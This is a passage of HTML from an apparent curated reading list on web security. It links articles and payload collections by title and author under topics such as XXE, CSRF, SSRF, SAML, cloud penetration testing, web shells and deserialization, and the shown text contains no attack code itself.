data-url=\"aHR0cHM6Ly9iMW5nei5naXRodWIuaW8vWFhFLWxlYXJuaW5nLW5vdGUv\">XXE 漏洞的简单理解和测试</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iMW5nei5naXRodWIuaW8v\">@b1ngz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9waG9uZXhpY3VtLmdpdGh1Yi5pby9pbmZvc2VjL3h4ZS5odG1s\">XXE</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9waG9uZXhpY3Vt\">@phonexicum</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3h4ZQ==\">XML external entity (XXE) injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnNlY3VyaXR5LmNvbS9kb3dubG9hZC9wdWJsaWNhdGlvbnMvWE1MRFRERW50aXR5QXR0YWNrcy5wZGY=\">XML Schema, DTD, and Entity Attacks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9lY2JmdHc=\">Timothy D. Morgan</span> and Omar Al Ibrahim.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gveHhlLWluamVjdGlvbi1wYXlsb2FkLWxpc3Q=\">payloadbox/xxe-injection-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1hYRSUyMEluamVjdGlvbg==\">PayloadsAllTheThings - XXE Injection</span> - Written by various contributors.</li>\n</ul>\n<p><a name=\"csrf\"></a></p>\n<h3 id=\"csrf-cross-site-request-forgery\"><a class=\"anchor\" href=\"#csrf-cross-site-request-forgery\">#</a> CSRF - Cross-Site Request Forgery</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVyL3dpcGluZy1vdXQtY3NyZi1kZWQ5N2FlN2U4M2Y=\">Wiping Out CSRF</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bqcm96bmVy\">@jrozner</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cudGVjaGJyaWRnZS5jYy8yMDE3LzAyLzI1L2NzcmYtaW50cm9kdWN0aW9uLw==\">讓我們來談談 CSRF</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cudGVjaGJyaWRnZS5jYy8=\">TechBridge</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL0NTUkYlMjBJbmplY3Rpb24=\">PayloadsAllTheThings - CSRF Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"clickjacking\"></a></p>\n<h3 id=\"clickjacking\"><a class=\"anchor\" href=\"#clickjacking\">#</a> Clickjacking</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW1wZXJ2YS5jb20vbGVhcm4vYXBwbGljYXRpb24tc2VjdXJpdHkvY2xpY2tqYWNraW5nLw==\">Clickjacking</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaW1wZXJ2YS5jb20v\">Imperva</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N1cmU1My9QdWJsaWNhdGlvbnMvYmxvYi9tYXN0ZXIveGZvLWNsaWNramFja2luZy5wZGY/cmF3PXRydWU=\">X-Frame-Options: All about Clickjacking?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zbGlkZXNoYXJlLm5ldC94MDBtYXJpbw==\">Mario Heiderich</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm0xNTdxLnR3L3Bvc3RzLzIwMTgvMDcvMjMvY2xpY2tqYWNraW5nLWZyYW1lLWF0dGFjay1kZWZlbnNlLw==\">新增幾項設定來防範 Clickjacking Frame Attack</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm0xNTdxLnR3Lw==\">M157q</span>.</li>\n</ul>\n<p><a name=\"ssrf\"></a></p>\n<h3 id=\"ssrf-server-side-request-forgery\"><a class=\"anchor\" href=\"#ssrf-server-side-request-forgery\">#</a> SSRF - Server-Side Request Forgery</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZG9jdW1lbnQvZC8xdjFUa1dadHJoelJMeTBiWVhCY2RMVWVkWEdiOW5qVE5JSlhhM3U5YWtITS9lZGl0\">SSRF bible. Cheatsheet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsYXJtLmNvbS8=\">Wallarm</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NlcnZlciUyMFNpZGUlMjBSZXF1ZXN0JTIwRm9yZ2VyeQ==\">PayloadsAllTheThings - Server-Side Request Forgery</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"web-cache-poisoning\"></a></p>\n<h3 id=\"web-cache-poisoning\"><a class=\"anchor\" href=\"#web-cache-poisoning\">#</a> Web Cache Poisoning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==\">Practical Web Cache Poisoning</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hbGJpbm93YXg=\">@albinowax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1dlYiUyMENhY2hlJTIwRGVjZXB0aW9u\">PayloadsAllTheThings - Web Cache Deception</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"relative-path-overwrite\"></a></p>\n<h3 id=\"relative-path-overwrite\"><a class=\"anchor\" href=\"#relative-path-overwrite\">#</a> Relative Path Overwrite</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFjb2x5ZXIub3JnLzIwMTgvMDUvMjgvbGFyZ2Utc2NhbGUtYW5hbHlzaXMtb2Ytc3R5bGUtaW5qZWN0aW9uLWJ5LXJlbGF0aXZlLXBhdGgtb3ZlcndyaXRlLw==\">Large-scale analysis of style injection by relative path overwrite</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFjb2x5ZXIub3JnLw==\">The Morning Paper</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWJzZC5qcC9XaGl0ZXBhcGVyL3Jwby5wZGY=\">MBSD Technical Whitepaper - A few RPO exploitation techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWJzZC5qcC8=\">Mitsui Bussan Secure Directions, Inc.</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE2NjczMS5odG1s\">RPO 攻击方式的探究</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXV0aG9yL0swcnozbg==\">K0rz3n</span>.</li>\n</ul>\n<p><a name=\"open-redirect\"></a></p>\n<h3 id=\"open-redirect\"><a class=\"anchor\" href=\"#open-redirect\">#</a> Open Redirect</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMGNrZXQ3LmNvbS9vcGVuLXJlZGlyZWN0LXZ1bG5lcmFiaWxpdHkv\">Open Redirect Vulnerability</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMGNrZXQ3LmNvbS8=\">s0cket7</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3gvb3Blbi1yZWRpcmVjdC1wYXlsb2FkLWxpc3Q=\">payloadbox/open-redirect-payload-list</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BheWxvYWRib3g=\">@payloadbox</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL09wZW4lMjBSZWRpcmVjdA==\">PayloadsAllTheThings - Open Redirect</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"saml\"></a></p>\n<h3 id=\"security-assertion-markup-language-saml\"><a class=\"anchor\" href=\"#security-assertion-markup-language-saml\">#</a> Security Assertion Markup Language (SAML)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYvYmxvZy8yMDE5LTAzLTA3LWhvdy10by10ZXN0LXNhbWwtYS1tZXRob2RvbG9neS8=\">How to Hunt Bugs in SAML; a Methodology - Part I</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYv\">epi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYvYmxvZy8yMDE5LTAzLTEzLWhvdy10by10ZXN0LXNhbWwtYS1tZXRob2RvbG9neS1wYXJ0LXR3by8=\">How to Hunt Bugs in SAML; a Methodology - Part II</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYv\">epi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYvYmxvZy8yMDE5LTAzLTE2LWhvdy10by10ZXN0LXNhbWwtYS1tZXRob2RvbG9neS1wYXJ0LXRocmVlLw==\">How to Hunt Bugs in SAML; a Methodology - Part III</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lcGkwNTIuZ2l0bGFiLmlvL25vdGVzLXRvLXNlbGYv\">epi</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NBTUwlMjBJbmplY3Rpb24=\">PayloadsAllTheThings - SAML Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"upload\"></a></p>\n<h3 id=\"upload\"><a class=\"anchor\" href=\"#upload\">#</a> Upload</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG9jcy9lbmdsaXNoLzQ1MDc0LWZpbGUtdXBsb2FkLXJlc3RyaWN0aW9ucy1ieXBhc3MucGRm\">File Upload Restrictions Bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vYXV0aG9yLz9hPTkzODE=\">Haboob Team</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1VwbG9hZCUyMEluc2VjdXJlJTIwRmlsZXM=\">PayloadsAllTheThings - Upload Insecure Files</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n</ul>\n<p><a name=\"rails\"></a></p>\n<h3 id=\"rails\"><a class=\"anchor\" href=\"#rails\">#</a> Rails</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvMjAxNS8wNy8yNC90aGUtdnVsbmVyYWJpbGl0eS1vZi1keW5hbWljLXJlbmRlci1wYXRocy1pbi1yYWlscy8=\">Rails 動態樣板路徑的風險</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RldmNvLnJlL2Jsb2cvYXV0aG9yL3NoYW9saW4v\">Shaolin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrbWQuaW8vcy9Ta3VUVnc1Ty0=\">Rails Security - First part</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">@qazbnm456</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JydW5vZmFjY2EvemVuLXJhaWxzLXNlY3VyaXR5LWNoZWNrbGlzdA==\">Zen Rails Security Checklist</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JydW5vZmFjY2E=\">@brunofacca</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYWlscy1zcWxpLm9yZw==\">Rails SQL Injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ByZXNpZGVudGJlZWY=\">@presidentbeef</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2d1aWRlcy5ydWJ5b25yYWlscy5vcmcvc2VjdXJpdHkuaHRtbA==\">Official Rails Security Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ydWJ5b25yYWlscy5vcmcv\">Rails team</span>.</li>\n</ul>\n<p><a name=\"angularjs\"></a></p>\n<h3 id=\"angularjs\"><a class=\"anchor\" href=\"#angularjs\">#</a> AngularJS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucG9ydHN3aWdnZXIubmV0LzIwMTYvMDEveHNzLXdpdGhvdXQtaHRtbC1jbGllbnQtc2lkZS10ZW1wbGF0ZS5odG1s\">XSS without HTML: Client-Side Template Injection with AngularJS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxvZ2dlci5jb20vcHJvZmlsZS8xMDg1NjE3ODUyNDgxMTU1MzQ3NQ==\">Gareth Heyes</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucG9ydHN3aWdnZXIubmV0LzIwMTcvMDUvZG9tLWJhc2VkLWFuZ3VsYXJqcy1zYW5kYm94LWVzY2FwZXMuaHRtbA==\">DOM based Angular sandbox escapes</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYXJldGhoZXllcw==\">@garethheyes</span></li>\n</ul>\n<p><a name=\"reactjs\"></a></p>\n<h3 id=\"reactjs\"><a class=\"anchor\" href=\"#reactjs\">#</a> ReactJS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2RhbmxlYy5jb20vYmxvZy94c3MtdmlhLWEtc3Bvb2ZlZC1yZWFjdC1lbGVtZW50\">XSS via a spoofed React element</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2RhbmxlYy5jb20v\">Daniel LeCheminant</span>.</li>\n</ul>\n<p><a name=\"ssl-tls\"></a></p>\n<h3 id=\"ssltls\"><a class=\"anchor\" href=\"#ssltls\">#</a> SSL/TLS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXB0aXZlLmNvLnVrL2Jsb2cvdGxzLXNzbC1zZWN1cml0eS10ZXN0aW5nLw==\">SSL &amp; TLS Penetration Testing</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXB0aXZlLmNvLnVrLw==\">APTIVE</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hha2t5NTQvbXV0dWFsLXRscy1zc2w=\">Practical introduction to SSL/TLS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hha2t5NTQ=\">@Hakky54</span>.</li>\n</ul>\n<p><a name=\"webmail\"></a></p>\n<h3 id=\"webmail\"><a class=\"anchor\" href=\"#webmail\">#</a> Webmail</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21vdHRvaW4vU2VjUGFwZXIvYmxvYi9tYXN0ZXIvV2VibWFpbC1IYWNraW5nLnBkZg==\">Webmail-Hacking</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZjFuNGxseS8=\">千域千寻</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJpcHN0ZWNoLmNvbS8yMDE3L3doeS1tYWlsLWlzLWRhbmdlcm91cy1pbi1waHAv\">Why mail() is dangerous in PHP</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmlwc3RlY2guY29tLw==\">Robin Peraglie</span>.</li>\n</ul>\n<p><a name=\"nfs\"></a></p>\n<h3 id=\"nfs\"><a class=\"anchor\" href=\"#nfs\">#</a> NFS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0YWNhZGVteS53b3JkcHJlc3MuY29tLzIwMTcvMDkvMjAvbmZzLz90PTEmYW1wO2NuPVpteGxlR2xpYkdWZmNtVmpjMTh5JmFtcDtyZWZzcmM9ZW1haWwmYW1wO2lpZD1iMzQ0MjJjZTE1MTY0ZTk5YTE5M2ZlYTBjY2M3YTAyZiZhbXA7dWlkPTE5NTk2ODAzNTImYW1wO25pZD0yNDQrMjg5NDc2NjE2\">NFS | PENETRATION TESTING ACADEMY</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0YWNhZGVteS53b3JkcHJlc3MuY29tLw==\">PENETRATION ACADEMY</span>.</li>\n</ul>\n<p><a name=\"aws\"></a></p>\n<h3 id=\"aws\"><a class=\"anchor\" href=\"#aws\">#</a> AWS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20vcGVuZXRyYXRpb24tdGVzdGluZy9wZW5ldHJhdGlvbi10ZXN0aW5nLWF3cy1zdG9yYWdlLw==\">PENETRATION TESTING AWS STORAGE: KICKING THE S3 BUCKET</span> - Written by Dwight Hohnstein from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20v\">Rhino Security Labs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tL2F3cy1wZW5ldHJhdGlvbi10ZXN0aW5nLXBhcnQtMS1zMy1idWNrZXRzLw==\">AWS PENETRATION TESTING PART 1. S3 BUCKETS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tLw==\">VirtueSecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tL2F3cy1wZW5ldHJhdGlvbi10ZXN0aW5nLXBhcnQtMi1zMy1pYW0tZWMyLw==\">AWS PENETRATION TESTING PART 2. S3, IAM, EC2</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydHVlc2VjdXJpdHkuY29tLw==\">VirtueSecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmYtc2VjdXJlLmNvbS9ibG9nL21pc2FkdmVudHVyZXMtaW4tYXdz\">Misadventures in AWS</span> - Written by Christian Demko</li>\n</ul>\n<p><a name=\"azure\"></a></p>\n<h3 id=\"azure\"><a class=\"anchor\" href=\"#azure\">#</a> Azure</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20vY2xvdWQtc2VjdXJpdHkvY29tbW9uLWF6dXJlLXNlY3VyaXR5LXZ1bG5lcmFiaWxpdGllcy8=\">Common Azure Security Vulnerabilities and Misconfigurations</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9yaGlub2JlbmphbWlu\">@rhinobenjamin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yaGlub3NlY3VyaXR5bGFicy5jb20vYXp1cmUvY2xvdWQtc2VjdXJpdHktcmlza3MtcGFydC0xLWF6dXJlLWNzdi1pbmplY3Rpb24tdnVsbmVyYWJpbGl0eS8=\">Cloud Security Risks (Part 1): Azure CSV Injection Vulnerability</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zcGVuZ2lldHo=\">@spengietz</span>.</li>\n</ul>\n<p><a name=\"fingerprint\"></a></p>\n<h3 id=\"fingerprint\"><a class=\"anchor\" href=\"#fingerprint\">#</a> Fingerprint</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy93ZWIvMTI3MjY2Lmh0bWw=\">浅谈 Web 客户端追踪</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hdXRob3IvYXJrdGVhbQ==\">arkteam</span>.</li>\n</ul>\n<p><a name=\"sub-domain-enumeration\"></a></p>\n<h3 id=\"sub-domain-enumeration\"><a class=\"anchor\" href=\"#sub-domain-enumeration\">#</a> Sub Domain Enumeration</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9hLXBlbmV0cmF0aW9uLXRlc3RlcnMtZ3VpZGUtdG8tc3ViLWRvbWFpbi1lbnVtZXJhdGlvbi03ZDg0MmQ1NTcwZjY=\">A penetration tester’s guide to sub-domain enumeration</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFwcHNlY2NvLmNvbS9AeWFtYWtpcmFf\">Bharath</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN3ZWVwYXRpYy5jb20vYXJ0LW9mLXN1YmRvbWFpbi1lbnVtZXJhdGlvbi8=\">The Art of Subdomain Enumeration</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN3ZWVwYXRpYy5jb20vYXV0aG9yL3BhdHJpay8=\">Patrik Hudak</span>.</li>\n</ul>\n<p><a name=\"crypto\"></a></p>\n<h3 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXR0ZXJjcnlwdG8ub3JnLw==\">Applied Crypto Hardening</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZXR0ZXJjcnlwdG8ub3JnLw==\">The bettercrypto.org Team</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Nvb25saW5lLmNvbS9hcnRpY2xlLzMzODg2NDcvd2hhdC1pcy1hLXNpZGUtY2hhbm5lbC1hdHRhY2staG93LXRoZXNlLWVuZC1ydW5zLWFyb3VuZC1lbmNyeXB0aW9uLXB1dC1ldmVyeW9uZS1hdC1yaXNrLmh0bWw=\">What is a Side-Channel Attack ?</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Nvb25saW5lLmNvbS9hdXRob3IvSi5NLi1Qb3J1cC8=\">J.M Porup</span>.</li>\n</ul>\n<p><a name=\"web-shell\"></a></p>\n<h3 id=\"web-shell\"><a class=\"anchor\" href=\"#web-shell\">#</a> Web Shell</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vYmxvZy9odW50aW5nLWZvci13ZWItc2hlbGxz\">Hunting for Web Shells</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vcHJvZmlsZS9qYWNvYi1iYWluZXM=\">Jacob Baines</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vaGFja2luZy13aXRoLWpzcC1zaGVsbHMv\">Hacking with JSP Shells</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9fbnVsbGJpbmQ=\">@_nullbind</span>.</li>\n</ul>\n<p><a name=\"osint\"></a></p>\n<h3 id=\"osint\"><a class=\"anchor\" href=\"#osint\">#</a> OSINT</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BzM3lmdWxsYWgvaGFja2luZy1jcnlwdG9jdXJyZW5jeS1taW5lcnMtd2l0aC1vc2ludC10ZWNobmlxdWVzLTY3N2JiYjNlMDE1Nw==\">Hacking Cryptocurrency Miners with OSINT Techniques</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BzM3lmdWxsYWg=\">@s3yfullah</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbWlhb3NraS9vc2ludC14LXVjY3Utd29ya3Nob3Atb24tb3Blbi1zb3VyY2UtaW50ZWxsaWdlbmNl\">OSINT x UCCU Workshop on Open Source Intelligence</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvbWlhb3NraQ==\">Philippe Lin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1memQzemtBSV9vNA==\">102 Deep Dive in the Dark Web OSINT Style Kirby Plessas</span> - Presented by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9raXJic3Ry\">@kirbstr</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmx1cmJpei5pby9ibG9nL3RoZS1tb3N0LWNvbXBsZXRlLWd1aWRlLXRvLWZpbmRpbmctYW55b25lcy1lbWFpbA==\">The most complete guide to finding anyone’s email</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmx1cmJpei5pby8=\">Timur Daudpota</span>.</li>\n</ul>\n<p><a name=\"dns-rebinding\"></a></p>\n<h3 id=\"dns-rebinding\"><a class=\"anchor\" href=\"#dns-rebinding\">#</a> DNS Rebinding</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BicmFubm9uZG9yc2V5L2F0dGFja2luZy1wcml2YXRlLW5ldHdvcmtzLWZyb20tdGhlLWludGVybmV0LXdpdGgtZG5zLXJlYmluZGluZy1lYTcwOThhMmQzMjU=\">Attacking Private Networks from the Internet with DNS Rebinding</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BicmFubm9uZG9yc2V5\">@brannondorsey</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYWRla2svaGFja2Vycy1jYW4tZ2V0LWFjY2Vzcy10by15b3VyLWhvbWUtcm91dGVyLTFkZGFkZDEyYTdhNw==\">Hacking home routers from the Internet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0ByYWRla2s=\">@radekk</span></li>\n</ul>\n<p><a name=\"deserialization\"></a></p>\n<h3 id=\"deserialization\"><a class=\"anchor\" href=\"#deserialization\">#</a> Deserialization</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3hnbG92ZXNlY3VyaXR5LmNvbS8yMDE1LzExLzA2L3doYXQtZG8td2VibG9naWMtd2Vic3BoZXJlLWpib3NzLWplbmtpbnMtb3Blbm5tcy1hbmQteW91ci1hcHBsaWNhdGlvbi1oYXZlLWluLWNvbW1vbi10aGlzLXZ1bG5lcmFiaWxpdHkv\">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</span> - Written by <span class=\"exturl\" 